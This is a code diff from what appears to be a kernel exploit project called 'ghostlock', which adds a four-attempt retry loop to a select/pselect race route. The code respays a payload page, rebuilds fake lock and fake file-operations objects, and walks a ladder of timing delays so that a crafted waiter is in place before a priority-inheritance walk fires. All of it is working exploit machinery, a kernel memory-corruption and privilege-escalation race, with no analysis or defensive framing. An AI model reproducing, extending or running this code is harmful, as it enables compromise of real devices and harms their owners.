@@ -379,10 +379,22 @@ RouteStatus do_tcp_fake_lock_route(const WriteRequest *request) {
  * select_stack_delay_usec(const TargetProfile *, int). */
 static int route_delay_usec(const SelectStackRouteContext *context,
         int attempt) {
-    (void) attempt;
-    /* Both routes: let select/pselect establish its frame and stamp the
-     * crafted waiter before the PI walk fires. */
-    return (int) context->execution->select_enter_delay_us;
+    if (!context->layout.compact_waiter) {
+        (void) attempt;
+        /* Let select establish its frame and stamp the crafted waiter before
+         * the PI walk fires. */
+        return (int) context->execution->select_enter_delay_us;
+    }
+    /* Compact retry walks a delay ladder (U01/SELECT-01, mirroring the
+     * upstream 50d2b72 candidate list); the profile's enter delay seeds the
+     * first attempt. The ladder stays native-side until a Select device can
+     * validate a schema extension. */
+    const int seed = (int) context->execution->select_enter_delay_us;
+    static const int delays[] = {
+        50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000,
+    };
+    const int ladder = delays[(attempt - 1) % 8];
+    return attempt == 1 && seed > 0 ? seed : ladder;
 }
 
 void fdset_put_word(fd_set *set, int word, uint64_t value) {
@@ -627,62 +639,94 @@ RouteStatus SelectStackRoute::execute() noexcept {
     struct timespec route_t0;
     clock_gettime(CLOCK_MONOTONIC, &route_t0);
 
-    atomic_store(&race->consumer_calls, 0);
-    atomic_store(&race->consumer_success, 0);
-    atomic_store(&race->consumer_stop, 0);
-    int delay_usec = route::route_delay_usec(this, 1);
-    atomic_store(&race->route_delay_usec, delay_usec);
-    atomic_store(&race->consumer_go, 1);
+    /* Compact retries rebuild the payload page between attempts (U01/SELECT-01,
+     * mirroring upstream 50d2b72): a lost race clobbers the page, so every
+     * attempt resprays and re-derives fake_* before rebuilding the fd_sets.
+     * The consumer handshake advances consumer_go per attempt so the trigger
+     * is seen as a new sequence. */
+    const int attempts = layout.compact_waiter ? 4 : 1;
+    int calls_total = 0;
+    int successes_total = 0;
 
-    pr_info("pselect pre-select compact=%d +%.0fms\n",
-            layout.compact_waiter,
-            route::fops_elapsed_ms(&route_t0));
-    errno = 0;
-    if (layout.compact_waiter) {
-        uint32_t timeout_us = execution->select_timeout_us;
-        struct timespec ts = {
-                .tv_sec = timeout_us / 1000000,
-                .tv_nsec = (long) (timeout_us % 1000000) * 1000,
-        };
-        select_result = pselect(
-                PSELECT_ROUTE_NFDS, input_set.raw(), output_set.raw(),
-                exception_set.raw(), &ts, nullptr);
-    } else {
-        uint32_t timeout_us = execution->select_timeout_us;
-        struct timeval timeout = {
-                .tv_sec = timeout_us / 1000000,
-                .tv_usec = timeout_us % 1000000,
-        };
-        select_result = select(
-                PSELECT_ROUTE_NFDS, input_set.raw(), output_set.raw(),
-                exception_set.raw(), &timeout);
-    }
-    select_errno = errno;
-    route::restore_standard_io(stdio_backup);
-    pr_info("pselect post-select compact=%d +%.0fms ret=%d\n",
-            layout.compact_waiter, route::fops_elapsed_ms(&route_t0),
-            select_result);
-    atomic_store(&race->consumer_go, 0);
+    for (int attempt = 1; attempt <= attempts; attempt++) {
+        if (attempt > 1) {
+            const uintptr_t rebuilt = support::prepare_good_kernel_page(request);
+            if (!rebuilt || !(g_exploit_session.heap.current.fake_lock) ||
+                    !(g_exploit_session.heap.current.fake_fops)) {
+                pr_warning("pselect retry page prepare failed attempt=%d\n", attempt);
+                (void) fail(35, errno);
+                break;
+            }
+            route::select_stack_build_fdsets(this);
+            route::open_selected_fds(input_set.raw(), output_set.raw(),
+                    exception_set.raw(), block_fd(), pipe_write.get());
+            owned_input_set = input_set;
+            owned_output_set = output_set;
+            owned_exception_set = exception_set;
+        }
 
-    calls = atomic_load(&race->consumer_calls);
-    successes = atomic_load(&race->consumer_success);
-    if (calls > 0 && successes > 0) {
-        status.code = ROUTE_OK;
-        status.step = 0;
-        status.error_number = 0;
-    } else {
+        atomic_store(&race->consumer_calls, 0);
+        atomic_store(&race->consumer_success, 0);
+        atomic_store(&race->consumer_stop, 0);
+        int delay_usec = route::route_delay_usec(this, attempt);
+        atomic_store(&race->route_delay_usec, delay_usec);
+        atomic_store(&race->consumer_go, attempt);
+
+        pr_info("pselect pre-select attempt=%d/%d compact=%d +%.0fms\n",
+                attempt, attempts, layout.compact_waiter,
+                route::fops_elapsed_ms(&route_t0));
+        errno = 0;
+        if (layout.compact_waiter) {
+            uint32_t timeout_us = execution->select_timeout_us;
+            struct timespec ts = {
+                    .tv_sec = timeout_us / 1000000,
+                    .tv_nsec = (long) (timeout_us % 1000000) * 1000,
+            };
+            select_result = pselect(
+                    PSELECT_ROUTE_NFDS, input_set.raw(), output_set.raw(),
+                    exception_set.raw(), &ts, nullptr);
+        } else {
+            uint32_t timeout_us = execution->select_timeout_us;
+            struct timeval timeout = {
+                    .tv_sec = timeout_us / 1000000,
+                    .tv_usec = timeout_us % 1000000,
+            };
+            select_result = select(
+                    PSELECT_ROUTE_NFDS, input_set.raw(), output_set.raw(),
+                    exception_set.raw(), &timeout);
+        }
+        select_errno = errno;
+        route::restore_standard_io(stdio_backup);
+        pr_info("pselect post-select attempt=%d/%d compact=%d +%.0fms ret=%d\n",
+                attempt, attempts, layout.compact_waiter,
+                route::fops_elapsed_ms(&route_t0), select_result);
+        atomic_store(&race->consumer_go, 0);
+
+        const int calls = atomic_load(&race->consumer_calls);
+        const int successes = atomic_load(&race->consumer_success);
+        calls_total += calls;
+        successes_total += successes;
+        if (calls > 0 && successes > 0) {
+            status.code = ROUTE_OK;
+            status.step = 0;
+            status.error_number = 0;
+            break;
+        }
         (void) fail(33, select_errno);
     }
+    calls = calls_total;
+    successes = successes_total;
     return status;
 }
 
 namespace ghostlock::route {
 
 RouteStatus do_pselect_fake_lock_route(const WriteRequest *request) {
-    /* TODO(post-S15:SELECT-01): Compact outer retries must
-     * rebuild both ghostlock::memory::HeapContext payload ownership and PiRaceContext sequencing.
-     * Keep this route invocation single-shot until ExploitSession can create a
-     * fresh context per attempt; timeout/delay remain profile-owned meanwhile. */
+    /* U01/SELECT-01: SelectStackRoute::execute() now retries compact routes
+     * four times, rebuilding the payload page and fd_sets per attempt and
+     * advancing the consumer handshake. The delay ladder and the attempt
+     * count stay native-side until a Select device can validate a
+     * profile-schema extension; the profile still owns the timeout. */
     SelectStackRouteContext context(
             &g_exploit_session.race, request, execution_settings(),
             target_profile_select_stack_layout(&g_exploit_session.profile),
